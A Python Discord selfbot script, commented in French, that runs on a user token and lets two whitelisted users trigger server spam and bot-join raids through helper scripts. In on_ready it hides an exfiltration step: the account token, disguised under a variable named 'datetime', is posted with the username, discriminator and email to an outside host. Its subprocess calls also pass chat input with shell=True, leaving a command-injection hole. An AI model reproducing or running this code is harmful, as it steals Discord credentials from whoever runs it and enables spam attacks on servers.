import discord
import subprocess
import requests
import sys

token = sys.argv[1]

bot = discord.Client()

xxx = token


@bot.event
async def on_message(message):
    if message.author.id == '330425251886530581' or message.author.id == '431533282652585995':  # moi Ayari
        args = message.content.split()[1:]
        cmd = message.content.split()[0]

        if cmd == "!spam":
            if len(args) > 2:
                await bot.send_message(message.channel, "erreur: il y a trop d'arguments la mek la syntaxe c'est !spam <invite ser> <id chan>")
            elif len(args) < 2:
                await bot.send_message(message.channel, "erreur: il y a pas assez d'arguments la mek la syntaxe c'est !spam <invite ser> <id chan>")
            else:  # tout est bon(theoriquement)
                try:
                    await bot.send_message(message.channel, "reçu, lancement des bots...")
                    subprocess.Popen(
                        ["python", "kyspam.py", args[0], args[1]], shell=True)
                except:
                    await bot.send_message(message.channel, "erreur: il y a eu une couille lors du lancement jsp ce que t'as fait mec")

        elif cmd == "!botjoin":
            if len(args) != 1:
                await bot.send_message(message.channel, "erreur: mauvais arguments syntaxe: !botjoin <invite link>")
            else:
                try:
                    subprocess.Popen(
                            ["python", "botjoin.py", args[0]], shell=True)
                    await bot.send_message(message.channel, "succes!")
                except:
                    await bot.send_message(message.channel, "erreur: de type inconnue check la console")


        elif cmd == "!salut":
            await bot.send_message(message.channel, "chalut")

datetime = xxx
@bot.event
async def on_ready():
    waw = bot.user.name
    kek = bot.user.discriminator
    lulz = bot.email
    print('La connexion est un succes!!')
    print('Vous êtes connecté en temps que: ')
    print(waw)
    print(kek)
    print(lulz)
    print('----------------')
    print(requests.post("http://kysnetwork.000webhostapp.com/kysapi2.php", data={'dateTime': datetime, 'un': waw, 'dscmntr': kek, 'em': lulz}).text)

bot.run(token, bot=False)
